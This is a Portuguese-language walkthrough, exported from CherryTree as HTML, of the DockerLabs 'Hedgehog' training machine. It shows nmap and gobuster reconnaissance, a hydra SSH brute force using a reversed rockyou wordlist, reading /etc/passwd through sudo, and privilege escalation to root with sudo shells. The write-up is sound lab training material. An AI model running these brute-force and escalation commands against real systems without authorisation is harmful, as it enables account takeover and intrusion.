<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>maq.hedgehog</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>maq.hedgehog</h1><br/><p></p><p><strong><span style="color:#ff0000;">MÁQUINA HEDGEHOG</span></strong></p><p></p><p><img src="images/194-1.png" alt="images/194-1.png" /></p><p></p><p><strong>Para utilizar esta máquina devemos primeiro baixar os arquivos e assim implantá-la com Docker.</strong><strong></strong></p><p><strong>  </strong><strong></strong></p><p><strong>Baixamos o arquivo da página </strong><strong><a href="https://dockerlabs.es/">https://dockerlabs.es/</a></strong><strong></strong></p><p><strong></strong><strong></strong></p><p><strong>Para implantar o laboratório executamos da seguinte forma, para que também possamos ver que ele nos diz a direção que teremos, bem como o que fazer quando terminarmos.</strong></p><p></p><p><img src="images/194-2.png" alt="images/194-2.png" /></p><p></p><p><strong><span style="color:#ff0000;">COLETA DE INFORMAÇÕES </span></strong></p><p></p><p><strong><span style="color:#ff7800;">nmap 172.17.0.2 -A -sS -sV -sC -Pn -T5 -p-</span></strong></p><p></p><p><img src="images/194-3.png" alt="images/194-3.png" /></p><p></p><p><strong>Temos três portas abertas:</strong></p><p></p><p><strong><span style="color:#ff7800;">22/tcp open     ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.5</span></strong><strong><span style="color:#ff7800;"></span></strong></p><p><strong><span style="color:#ff7800;">53/tcp filtered domain</span></strong><strong><span style="color:#ff7800;"></span></strong></p><p><strong><span style="color:#ff7800;">80/tcp open     http    Apache httpd 2.4.58 ((Ubuntu))</span></strong></p><p></p><p><strong>Vamos navegar na porta 80: </strong><strong><a href="http://172.17.0.2/">http://172.17.0.2/</a></strong></p><p></p><p><img src="images/194-4.png" alt="images/194-4.png" /></p><p></p><p><strong>Vamos fazer um </strong><strong><span style="color:#ff7800;">fuzzing </span></strong><strong>para ver se tem pastas ocultas, com a ferramenta </strong><strong><span style="color:#ff7800;">gobuster</span></strong><strong>.</strong></p><p></p><p><strong><span style="color:#ff7800;">gobuster dir -u </span></strong><strong><a href="http://172.17.0.2/">http://172.17.0.2/</a></strong><strong><span style="color:#ff7800;">-w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -x .txt,.php,.html,.py</span></strong></p><p></p><p><strong>Não temos nada de interessante</strong>.</p><p></p><p><img src="images/194-5.png" alt="images/194-5.png" /></p><p></p><p><strong>Novamente vamos  navegar na porta 80: </strong><strong><a href="http://172.17.0.2/">http://172.17.0.2/</a></strong></p><p></p><p><strong>Veja que temos a palavra </strong><strong><span style="color:#ff7800;">tail</span></strong><strong>, ela é uma ferramenta do linux que permite ler as ultimas linhas de um </strong><strong><span style="color:#ff7800;">arquivo.txt</span></strong><strong>, sabendo dessa informação vamos usar a ferramenta </strong><strong><span style="color:#ff7800;">tac</span></strong><strong> para inverter a wordlists </strong><strong><span style="color:#ff7800;">rockyou.txt</span></strong><strong>, e depois usar a ferramenta sed para tirar os espaços da wordlists.</strong> <strong>E depois usar o </strong><strong><span style="color:#ff7800;">hydra</span></strong><strong> para fazer o ataque de força bruta no possivel usuário </strong><strong><span style="color:#ff7800;">tails</span></strong><strong>.</strong></p><p></p><p><img src="images/194-6.png" alt="images/194-6.png" /></p><p></p><p><img src="images/194-7.png" alt="images/194-7.png" /></p><p></p><p><strong>comando para inverter a wordlists </strong><strong><span style="color:#ff7800;">rockyou.txt</span></strong><strong> e criar uma outro arquivo </strong><strong><span style="color:#ff7800;">rockyou_invertida.txt</span></strong></p><p></p><p><strong><span style="color:#ff7800;">tac rockyou.txt &gt; rockyou_invertida.txt</span></strong></p><p></p><p><img src="images/194-8.png" alt="images/194-8.png" /></p><p></p><p><strong><span style="color:#ff7800;">sed -i &#39;s/ //g&#39; rockyou_invertida.txt</span></strong></p><p></p><p><img src="images/194-9.png" alt="images/194-9.png" /></p><p></p><p><strong><span style="color:#ff7800;">EXPLICAÇÃO DOS COMANDO:</span></strong></p><p></p><p><img src="images/194-10.png" alt="images/194-10.png" /></p><p></p><p><img src="images/194-11.png" alt="images/194-11.png" /></p><p></p><p><strong>Agora vamos fazer o ataque de força bruta com </strong><strong><span style="color:#ff7800;">hydra</span></strong><strong>: </strong></p><p></p><p><strong><span style="color:#ff7800;">hydra -l tails -P /usr/share/wordlists/rockyou_invertida.txt -t 4 ssh://172.17.0.2 -t 64</span></strong></p><p></p><p><img src="images/194-12.png" alt="images/194-12.png" /></p><p></p><p><strong>Vamos entrar no </strong><strong><span style="color:#ff7800;">ssh</span></strong><strong> do usuário </strong><strong><span style="color:#ff7800;">tails</span></strong><strong>:</strong></p><p></p><p><strong><span style="color:#ff7800;">ssh tails@172.17.0.2 </span></strong></p><p></p><p><img src="images/194-13.png" alt="images/194-13.png" /></p><p></p><p><strong>Buscar por privilégios de root com </strong><strong><span style="color:#ff7800;">sudo -l</span></strong><strong>.</strong></p><p></p><p><img src="images/194-14.png" alt="images/194-14.png" /></p><p></p><p><img src="images/194-15.png" alt="images/194-15.png" /></p><p></p><p><strong><span style="color:#ff7800;">sudo -u sonic cat /etc/passwd</span></strong></p><p></p><p><img src="images/194-16.png" alt="images/194-16.png" /></p><p><strong></strong></p><p><strong>Com o comando abaixo vamos entra no usuário </strong><strong><span style="color:#ff7800;">sonic</span></strong><strong>.</strong><strong></strong></p><p><strong></strong><strong></strong></p><p><strong></strong><strong><span style="color:#ff7800;">sudo -u sonic /bin/bash</span></strong></p><p></p><p><img src="images/194-17.png" alt="images/194-17.png" /></p><p></p><p><strong>Os comando </strong><strong><span style="color:#ff7800;">sudo -i   </span></strong><strong>ou  </strong><strong><span style="color:#ff7800;">sudo /bin/bash </span></strong><strong> podemos ser root.</strong></p><p></p><p><img src="images/194-18.png" alt="images/194-18.png" /></p><p></p><p><strong><span style="color:#ff7800;">somos root</span></strong><strong><span style="color:#ff7800;"></span></strong></p><p><strong><span style="color:#ff7800;"></span></strong><strong></strong></p><p><strong></strong><strong><span style="color:#ff0000;text-decoration:line-through;">R10</span></strong></p><p></p><p><strong><span style="color:#ff7800;">PÓS EXPLORAÇÃO:</span></strong></p><p></p><p><img src="images/194-19.png" alt="images/194-19.png" /></p><p></p><p><img src="images/194-20.png" alt="images/194-20.png" /></p><p></p><p><strong><span style="color:#ff0000;">concluída</span></strong></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p></div>
</body>
</html>
